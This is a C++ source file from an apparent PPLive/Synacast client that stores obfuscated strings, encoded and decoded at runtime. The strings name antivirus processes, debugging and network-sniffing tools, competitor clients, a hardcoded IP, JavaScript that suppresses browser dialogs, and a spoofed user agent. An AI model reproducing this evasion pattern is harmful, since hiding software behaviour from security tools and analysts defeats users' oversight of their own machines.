#include "stdafx.h"
#include "gstring.h"
#include <iostream>
#include <assert.h>
#include <synacast/util/SynacastUrlEncoding.h>

GString gs;

#ifdef NEED_LOG
GStringTest gst;
#endif

string& GString::operator [] (int index)
{
	if(m_isDecode[index] == false)
	{
		SynacastUrlEncoding encoding("running");
		m_string[index] = encoding.Decode(m_string[index]);
		m_isDecode[index] = true;
	}
	return m_string[index];
}

GString::GString()
{
	m_string[PROCESS_Monitor_exe]			=_T("3+Tc193d2aDa5tM=");			//monitor.exe            
	m_string[PROCESS_UpdateMonitor_exe]		=_T("x+XSz93TtOHj1+LY4JXX7dM=");	//UpdateMonitor.exe
	m_string[PROCESS_ppliveva_exe]			=_T("4uXa19/T3dOj0+bO");			//ppliveva.exe
	m_string[PROCESS_ppap_exe]				=_T("4uXP3pfT39c=");				//ppap.exe
	m_string[PROCESS_pplive_exe]			=_T("4uXa19/Tldft0w==");			//pplive.exe
	m_string[PROCESS_ppsap_exe]				=_T("4uXhz9mczOra");				//ppsap.exe
	m_string[PROCESS_FuckIUT_exe]			=_T("uOrR2bLDu6Da5tM=");			//FuckIUT.exe		
	m_string[PROCESS_PPDataActiver_exe]		=_T("wsWyz93PqNXp1+TO4JXX7dM=");	//PPDataActiver.exe
	m_string[PROCESS_PFSDataActiver_exe]	=_T("wrvBssriyLPY4tff09mg2ubT");	//PFSDataActiver.exe
	m_string[PROCESS_WCScheduler_exe]		=_T("ybjB0dHTy+fh0+CX09/X");		//WCScheduler.exe
	m_string[PROCESS_szplayer_exe]			=_T("5e/e2srnzOSj0+bO");			//szplayer.exe
	m_string[PROCESS_PPLite_exe]			=_T("wsW6193Tldft0w==");			//PPLite.exe
	m_string[PROCESS_pptv_scr]				=_T("4uXi5JfhyuQ=");				//pptv.scr
	m_string[PROCESS_ppgame_exe]			=_T("4uXVz9bTldft0w==");			//ppgame.exe

	m_string[PROCESS_iResea]				=_T("28fT4c7P");					//iResea
	m_string[PROCESS_PPLive_exe]			=_T("wsW619/Tldft0w==");			//PPLive.exe
	m_string[PROCESS_iresea]				=_T("2+fT4c7P");					//iresea
	m_string[PROCESS_PPStream]				=_T("wsXB4tvTyN8=");				//PPStream
	m_string[PROCESS_PPSAP]					=_T("wsXBr7k=");					//PPSAP
	m_string[PROCESS_PPSWangLuoDianShi]		=_T("wsXBO2EwTidcOEE=");			//PPS网络电视

	m_string[DOMAIN_INADDR_NONE]			=_T("u8Ovsq3AxsDEvLM=");			//INADDR_NONE
	m_string[DOMAIN_pp3_g1d_net]			=_T("4uWhnNCfy6Dj0+I=");			//pp3.g1d.net		
	m_string[DOMAIN_122_224_73_82]			=_T("o6egnJugm6CsoZyhoA==");		//122.224.73.82
	
	m_string[DEV_Visual_Assist]				=_T("yN7h48rah7Po4dfc4g==");		//Visual Assist
	m_string[DEV_Wireshark]					=_T("yd7g09zWyOTg");				//Wireshark
	m_string[DEV_WinPcap]					=_T("yd7cvszP1w==");				//WinPcap
	m_string[DEV_Sniffer]					=_T("xePX1M/T2Q==");				//Sniffer
	m_string[DEV_Borland]					=_T("tOTg2srcyw==");				//Borland
	m_string[DEV_Delphi]					=_T("ttra3tHX");					//Delphi
	m_string[DEV_HTTP_Analyzer]				=_T("usnCvomv1dPh5+jO4A==");		//HTTP Analyzer
	m_string[DEV_IEWatch]					=_T("u7rFz93Rzw==");				//IEWatch
	m_string[DEV_NetLimiter]				=_T("wNriutLb0Oba4A==");			//NetLimiter
	m_string[DEV_NetPeeker]					=_T("wNrivs7T0tfn");				//NetPeeker
	m_string[DEV_Socket_Moniter]			=_T("xeTR2c7ih7/k3Nfd3dk=");		//Socket Monitor
	m_string[DEV_Visual_Studio]				=_T("yN7h48rah8Xp49LS3Q==");		//Visual Studio
	m_string[DEV_Fiddler]					=_T("uN7S0tXT2Q==");				//Fiddler

	m_string[DEVP_SPYXX_EXE]				=_T("xcXHxsGcrMq6");				//SPYXX.EXE
	m_string[DEVP_NPGUI_EXE]				=_T("wMW1w7KczOra");				//NPGUI.exe
	m_string[DEVP_NetPeeker_exe]			=_T("wNrivs7T0tfnnNPh0w==");		//NetPeeker.exe
	m_string[DEVP_MSDEV_EXE]				=_T("v8iys7+crMq6");				//MSDEV.EXE
	m_string[DEVP_devenv_exe]				=_T("1trk09fkldft0w==");			//devenv.exe
	m_string[DEVP_procexp_exe]				=_T("4ufd0c7m16Da5tM=");			//procexp.exe
	m_string[DEVP_Filemon_exe]				=_T("uN7a09bd1aDa5tM=");			//Filemon.exe
	m_string[DEVP_HttpAnalyzer]				=_T("uuni3qrcyN7u6NPb");			//HttpAnalyzer
	m_string[DEVP_SOCKMON_EXE]				=_T("xcSxuba9taC6xrM=");			//SOCKMON.EXE
	m_string[DEVP_WINIPMON_EXE]				=_T("yb68t7m7tsCjs8au");			//WINIPMON.EXE
	m_string[DEVP_Fiddler_exe]				=_T("uN7S0tXT2aDa5tM=");			//Fiddler.exe
	m_string[DEVP_CPal_exe]					=_T("tcXP2pfT39c=");				//CPal.exe
	m_string[DEVP_ppstream_exe]				=_T("4uXh4tvTyN+j0+bO");			//ppstream.exe
	m_string[DEVP_ppsap_exe]				=_T("4uXhz9mczOra");				//ppsap.exe
	m_string[DEVP_PPSGame_exe]				=_T("wsXBtcrbzKDa5tM=");			//PPSGame.exe

	m_string[SAFEP_RavCopy_exe]				=_T("xNbksdje4KDa5tM=");			//RavCopy.exe
	m_string[SAFEP_RavTask_exe]				=_T("xNbkwsrh0qDa5tM=");			//RavTask.exe
	m_string[SAFEP_rsnetsvr_exe]			=_T("5Ojc093h3eSj0+bO");			//rsnetsvr.exe
	m_string[SAFEP_RSTray_exe]				=_T("xMjC4Mrnldft0w==");			//RSTray.exe
	m_string[SAFEP_scanfrm_exe]				=_T("5djP3M/g1KDa5tM=");			//scanfrm.exe
	m_string[SAFEP_avp_exe]					=_T("0+venM7mzA==");				//avp.exe
	m_string[SAFEP_KVMonXP_kxp]				=_T("vcu73dfGt6Dg5t4=");			//KVMonXP.kxp
	m_string[SAFEP_KVSrvXP_exe]				=_T("vcvB4N/Gt6Da5tM=");			//KVSrvXP.exe
	m_string[SAFEP_360tray_exe]				=_T("paue4tvP4KDa5tM=");			//360tray.exe
	m_string[SAFEP_360Safe_exe]				=_T("pauewcrUzKDa5tM=");			//360Safe.exe
	m_string[SAFEP_360rp_exe]				=_T("paue4NmczOra");				//360rp.exe
	m_string[SAFEP_360sd_exe]				=_T("paue4c2czOra");				//360sd.exe
	m_string[SAFEP_AluSchedulerSvc_exe]		=_T("s+HjwczWzNbq2tPbwd3Vo9Pmzg==");	//AluSchedulerSvc.exe
	m_string[SAFEP_ccSvcHst_exe]			=_T("1djB5My22uaj0+bO");			//ccSvcHst.exe
	m_string[SAFEP_symlcsvc_exe]			=_T("5e7b2szh3dWj0+bO");			//symlcsvc.exe
	m_string[SAFEP_comHost_exe]				=_T("1eTbttjh26Da5tM=");			//comHost.exe
	m_string[SAFEP_kavstart_exe]			=_T("3dbk4d3P2eaj0+bO");			//kavstart.exe
	m_string[SAFEP_kavbackreport_exe]		=_T("3dbk0MrR0uTa3t3b4pXX7dM=");	//kavbackreport.exe
	m_string[SAFEP_kissvc_exe]				=_T("3d7h4d/Rldft0w==");			//kissvc.exe
	m_string[SAFEP_kav32_exe]				=_T("3dbkoZuczOra");				//kav32.exe
	m_string[SAFEP_pfw_exe]					=_T("4tvlnM7mzA==");				//pfw.exe
	m_string[SAFEP_McNASvc_exe]				=_T("v9i8r7zkyqDa5tM=");			//McNASvc.exe
	m_string[SAFEP_McfSrv_exe]				=_T("v9jUwdvkldft0w==");			//McfSrv.exe
	m_string[SAFEP_McSACore_exe]			=_T("v9jBr6zd2dej0+bO");			//McSACore.exe
	m_string[SAFEP_McProxy_exe]				=_T("v9i+4Njm4KDa5tM=");			//McProxy.exe
	m_string[SAFEP_mcagent_exe]				=_T("39jP1c7c26Da5tM=");			//mcagent.exe
	m_string[SAFEP_mcmscsvc_exe]			=_T("39jb4czh3dWj0+bO");			//mcmscsvc.exe
	m_string[SAFEP_mcshell_exe]				=_T("39jh1s7a06Da5tM=");			//mcshell.exe
	m_string[SAFEP_McSchield_exe]			=_T("v9jB0dHXzN7ZnNPh0w==");		//McSchield.exe
	m_string[SAFEP_mcsysmon_exe]			=_T("39jh59zb1uCj0+bO");			//mcsysmon.exe
	m_string[SAFEP_nod32kui_exe]			=_T("4OTSoZvZ3Nuj0+bO");			//nod32kui.exe
	m_string[SAFEP_nod32krn_exe]			=_T("4OTSoZvZ2eCj0+bO");			//nod32krn.exe

	m_string[SAFE_RuiXin]					=_T("OmU+NQ==");					//瑞星				
	m_string[SAFE_KaBaSiJi]					=_T("MR0eOzQnIms=");				//卡巴斯基
	m_string[SAFE_JIangMing]				=_T("LyIxXw==");					//江民
	m_string[SAFE_360AnQuanWeiShi]			=_T("paueHhs2EkA1OC0=");			//360安全卫士
	m_string[SAFE_360ShaDu]					=_T("paueNxokJQ==");				//360杀毒
	m_string[SAFE_Norton]					=_T("wOTg4tjc");					//Norton
	m_string[SAFE_Symantec]					=_T("xe7bz9fizNU=");				//Symantec
	m_string[SAFE_JinShanDuBa]				=_T("L2U3Kx8sF0Y=");				//金山毒霸
	m_string[SAFE_JinShanWangBiao]			=_T("L2U3KzZmVkw=");				//金山网镖
	m_string[SAFE_TianWangFangHuoQiang]		=_T("PmE7ZiAuImI8Kw==");			//天网防火墙
	m_string[SAFE_McAfee]					=_T("v9iv1M7T");					//McAfee
	m_string[SAFE_NOD32]					=_T("wMSyoZs=");					//NOD32
	m_string[SAFE_ESET]						=_T("t8izwg==");					//ESET
	m_string[SAFE_MumaQingDaoFu]			=_T("NjMwWzBTHDIsYA==");			//木马清道夫
	m_string[SAFE_MuMaKeXin]				=_T("NjMwWyg5Nzk=");				//木马克星
	m_string[SAFE_EYiDAShi]					=_T("KGZAUB1hMRg=");				//恶意大师
	m_string[SAFE_WeiDianZhuDongFangYu]		=_T("QBcjUT9lHSEsLkFi");			//微点主动防御
	m_string[SAFE_ETrust]					=_T("t8ng49zi");					//ETrust
	m_string[SAFE_AVG]						=_T("s8u1");						//AVG

	m_string[SCRIPT_1]						=_T("6d7c0tjlldPh0+Ddq83n49Hi0t3Vmp6O6eY=");						//window.alert=function() {}
	m_string[SCRIPT_2]						=_T("6d7c0tjlldXk3NTS4NSv2+PczOLQ4eOWl4np2dfp4+DXjtvk6tOp5g==");	//window.confirm=function() {return true;}
	m_string[SCRIPT_3]						=_T("6d7c0tjlleLn3dvZ4qTY6tzR3dfW4J2XjuTgzObq4NyJ4tnn2qnr");		//window.prompt=function() {return true;}
	m_string[SCRIPT_4]						=_T("6d7c0tjlleXd3eW23cvT4bLXytrW2bLU49fR29vk3JaSjuLk2uLj29yH5ufj06Tr");		//window.showModalDialog=function() {return true;}
	m_string[SCRIPT_5]						=_T("6d7c0tjlleXd3eW23cvX4dPh3LLQ0+Hd1abU3ODY4tfY3I+blengzuLc5OOO4tvjzK3y");	//window.showModelessDialog=function() {return true;}
	m_string[SCRIPT_6]						=_T("6d7c0tjlleLn19zdq83n49Hi0t3Vmp6O6eY=");						//window.print=function() {}
	m_string[SCRIPT_7]						=_T("6d7c0tjlldft4tPb3Mjeo6/SzbTI6OTg192rzefj0eLS3dWano7p5g==");	//window.external.AddFavorit=function() {}

	m_string[STRING_UserAgent]				=_T("v+To19XayKGqnJ6Jlr7b49Ld4OGiksqpjsDX1dbk5eGJvLuSqpyfpI7M4KLDwaSO2eivn5yinJegq5eOsNPK3eSdoJmeoKKmn6eaoYe43uDTz93foaicnpek");	//Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6
//	m_string[STRING_LogUrl]					=_T("2uni3qOdluflnKDX19LXo93g0J2YoN3i29U=");
//	m_string[STRING_LogUrl2]				=_T("2uni3qOdluflnKDX19LXo93g0J2ZoN3i29U=");

	for(int i = 0; i < GSTRING_MAX; i ++)
		m_isDecode[i] = false;
}

#ifdef NEED_LOG
GStringTest::GStringTest()
{
	m_string[PROCESS_Monitor_exe]			=_T("monitor.exe");           
	m_string[PROCESS_UpdateMonitor_exe]		=_T("UpdateMonitor.exe");
	m_string[PROCESS_ppliveva_exe]			=_T("ppliveva.exe");
	m_string[PROCESS_ppap_exe]				=_T("ppap.exe");
	m_string[PROCESS_pplive_exe]			=_T("pplive.exe");
	m_string[PROCESS_ppsap_exe]				=_T("ppsap.exe");
	m_string[PROCESS_FuckIUT_exe]			=_T("FuckIUT.exe");		
	m_string[PROCESS_PPDataActiver_exe]		=_T("PPDataActiver.exe");
	m_string[PROCESS_PFSDataActiver_exe]	=_T("PFSDataActiver.exe");
	m_string[PROCESS_WCScheduler_exe]		=_T("WCScheduler.exe");
	m_string[PROCESS_szplayer_exe]			=_T("szplayer.exe");
	m_string[PROCESS_PPLite_exe]			=_T("PPLite.exe");	
	m_string[PROCESS_pptv_scr]				=_T("pptv.scr");
	m_string[PROCESS_ppgame_exe]			=_T("ppgame.exe");

	m_string[PROCESS_iResea]				=_T("iResea");
	m_string[PROCESS_PPLive_exe]			=_T("PPLive.exe");
	m_string[PROCESS_iresea]				=_T("iresea");
	m_string[PROCESS_PPStream]				=_T("PPStream");
	m_string[PROCESS_PPSAP]					=_T("PPSAP");
	m_string[PROCESS_PPSWangLuoDianShi]		=_T("PPS网络电视");

	m_string[DOMAIN_INADDR_NONE]			=_T("INADDR_NONE");
	m_string[DOMAIN_pp3_g1d_net]			=_T("pp3.g1d.net");		
	m_string[DOMAIN_122_224_73_82]			=_T("122.224.73.82");
	
	m_string[DEV_Visual_Assist]				=_T("Visual Assist");
	m_string[DEV_Wireshark]					=_T("Wireshark");
	m_string[DEV_WinPcap]					=_T("WinPcap");
	m_string[DEV_Sniffer]					=_T("Sniffer");
	m_string[DEV_Borland]					=_T("Borland");
	m_string[DEV_Delphi]					=_T("Delphi");
	m_string[DEV_HTTP_Analyzer]				=_T("HTTP Analyzer");
	m_string[DEV_IEWatch]					=_T("IEWatch");
	m_string[DEV_NetLimiter]				=_T("NetLimiter");
	m_string[DEV_NetPeeker]					=_T("NetPeeker");
	m_string[DEV_Socket_Moniter]			=_T("Socket Monitor");
	m_string[DEV_Visual_Studio]				=_T("Visual Studio");
	m_string[DEV_Fiddler]					=_T("Fiddler");

	m_string[DEVP_SPYXX_EXE]				=_T("SPYXX.EXE");
	m_string[DEVP_NPGUI_EXE]				=_T("NPGUI.exe");
	m_string[DEVP_NetPeeker_exe]			=_T("NetPeeker.exe");
	m_string[DEVP_MSDEV_EXE]				=_T("MSDEV.EXE");
	m_string[DEVP_devenv_exe]				=_T("devenv.exe");
	m_string[DEVP_procexp_exe]				=_T("procexp.exe");
	m_string[DEVP_Filemon_exe]				=_T("Filemon.exe");
	m_string[DEVP_HttpAnalyzer]				=_T("HttpAnalyzer");
	m_string[DEVP_SOCKMON_EXE]				=_T("SOCKMON.EXE");
	m_string[DEVP_WINIPMON_EXE]				=_T("WINIPMON.EXE");
	m_string[DEVP_Fiddler_exe]				=_T("Fiddler.exe");
	m_string[DEVP_CPal_exe]					=_T("CPal.exe");
	m_string[DEVP_ppstream_exe]				=_T("ppstream.exe");
	m_string[DEVP_ppsap_exe]				=_T("ppsap.exe");
	m_string[DEVP_PPSGame_exe]				=_T("PPSGame.exe");	

	m_string[SAFEP_RavCopy_exe]				=_T("RavCopy.exe");
	m_string[SAFEP_RavTask_exe]				=_T("RavTask.exe");
	m_string[SAFEP_rsnetsvr_exe]			=_T("rsnetsvr.exe");
	m_string[SAFEP_RSTray_exe]				=_T("RSTray.exe");
	m_string[SAFEP_scanfrm_exe]				=_T("scanfrm.exe");
	m_string[SAFEP_avp_exe]					=_T("avp.exe");
	m_string[SAFEP_KVMonXP_kxp]				=_T("KVMonXP.kxp");
	m_string[SAFEP_KVSrvXP_exe]				=_T("KVSrvXP.exe");
	m_string[SAFEP_360tray_exe]				=_T("360tray.exe");
	m_string[SAFEP_360Safe_exe]				=_T("360Safe.exe");
	m_string[SAFEP_360rp_exe]				=_T("360rp.exe");
	m_string[SAFEP_360sd_exe]				=_T("360sd.exe");
	m_string[SAFEP_AluSchedulerSvc_exe]		=_T("AluSchedulerSvc.exe");
	m_string[SAFEP_ccSvcHst_exe]			=_T("ccSvcHst.exe");
	m_string[SAFEP_symlcsvc_exe]			=_T("symlcsvc.exe");
	m_string[SAFEP_comHost_exe]				=_T("comHost.exe");
	m_string[SAFEP_kavstart_exe]			=_T("kavstart.exe");
	m_string[SAFEP_kavbackreport_exe]		=_T("kavbackreport.exe");
	m_string[SAFEP_kissvc_exe]				=_T("kissvc.exe");
	m_string[SAFEP_kav32_exe]				=_T("kav32.exe");
	m_string[SAFEP_pfw_exe]					=_T("pfw.exe");
	m_string[SAFEP_McNASvc_exe]				=_T("McNASvc.exe");
	m_string[SAFEP_McfSrv_exe]				=_T("McfSrv.exe");
	m_string[SAFEP_McSACore_exe]			=_T("McSACore.exe");
	m_string[SAFEP_McProxy_exe]				=_T("McProxy.exe");
	m_string[SAFEP_mcagent_exe]				=_T("mcagent.exe");
	m_string[SAFEP_mcmscsvc_exe]			=_T("mcmscsvc.exe");
	m_string[SAFEP_mcshell_exe]				=_T("mcshell.exe");
	m_string[SAFEP_McSchield_exe]			=_T("McSchield.exe");
	m_string[SAFEP_mcsysmon_exe]			=_T("mcsysmon.exe");
	m_string[SAFEP_nod32kui_exe]			=_T("nod32kui.exe");
	m_string[SAFEP_nod32krn_exe]			=_T("nod32krn.exe");

	m_string[SAFE_RuiXin]					=_T("瑞星");
	m_string[SAFE_KaBaSiJi]					=_T("卡巴斯基");
	m_string[SAFE_JIangMing]				=_T("江民");
	m_string[SAFE_360AnQuanWeiShi]			=_T("360安全卫士");
	m_string[SAFE_360ShaDu]					=_T("360杀毒");
	m_string[SAFE_Norton]					=_T("Norton");
	m_string[SAFE_Symantec]					=_T("Symantec");
	m_string[SAFE_JinShanDuBa]				=_T("金山毒霸");
	m_string[SAFE_JinShanWangBiao]			=_T("金山网镖");
	m_string[SAFE_TianWangFangHuoQiang]		=_T("天网防火墙");
	m_string[SAFE_McAfee]					=_T("McAfee");
	m_string[SAFE_NOD32]					=_T("NOD32");
	m_string[SAFE_ESET]						=_T("ESET");
	m_string[SAFE_MumaQingDaoFu]			=_T("木马清道夫");
	m_string[SAFE_MuMaKeXin]				=_T("木马克星");
	m_string[SAFE_EYiDAShi]					=_T("恶意大师");
	m_string[SAFE_WeiDianZhuDongFangYu]		=_T("微点主动防御");
	m_string[SAFE_ETrust]					=_T("ETrust");
	m_string[SAFE_AVG]						=_T("AVG");

	m_string[SCRIPT_1]						=_T("window.alert=function() {}");
	m_string[SCRIPT_2]						=_T("window.confirm=function() {return true;}");
	m_string[SCRIPT_3]						=_T("window.prompt=function() {return true;}");
	m_string[SCRIPT_4]						=_T("window.showModalDialog=function() {return true;}");
	m_string[SCRIPT_5]						=_T("window.showModelessDialog=function() {return true;}");
	m_string[SCRIPT_6]						=_T("window.print=function() {}");
	m_string[SCRIPT_7]						=_T("window.external.AddFavorit=function() {}");

	m_string[STRING_UserAgent]				=_T("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.6) Gecko/2009011913 Firefox/3.0.6");
//	m_string[STRING_LogUrl]					=_T("http://up.2nike.org/1.html");
//	m_string[STRING_LogUrl2]				=_T("http://up.2nike.org/2.html"); 
}
#endif

void GString::Show()
{
	#ifdef NEED_LOG
	SynacastUrlEncoding encoding("running");
	//CPal.exe ---> tcXP2pfT39c=
	//cout << "http://up.2nike.org/2.html" << " ---> " <<  encoding.Encode("http://up.2nike.org/2.html") << endl;
	//cout << "122.224.73.82" << " ---> " << encoding.Encode("122.224.73.82") << endl;
	//cout << "o6egnJugm6CsoJycpg==" << " ---> " << encoding.Decode( "o6egnJugm6CsoJycpg==") << endl;

	//ppstream.exe ---> 4uXh4tvTyN+j0+bO
	//ppsap.exe ---> 4uXhz9mczOra
	//PPSGame.exe ---> wsXBtcrbzKDa5tM=

	int i = 0;

//  	for(i = 0; i < GSTRING_MAX; i ++)
//  	{
//  		cout << m_string[i] << "\t";
//  		cout << m_isDecode[i] << "\t";
//  		cout << (*this)[i] << "\t";
//  		cout << m_isDecode[i] << endl;
//  	}

	for(i = 0; i < GSTRING_MAX; i ++)
	{
		if((*this)[i] != gst.m_string[i])
			cout << "============== Warning : " << (*this)[i] << " != " << gst.m_string[i] << " ==============" << endl;
	}

	#endif
}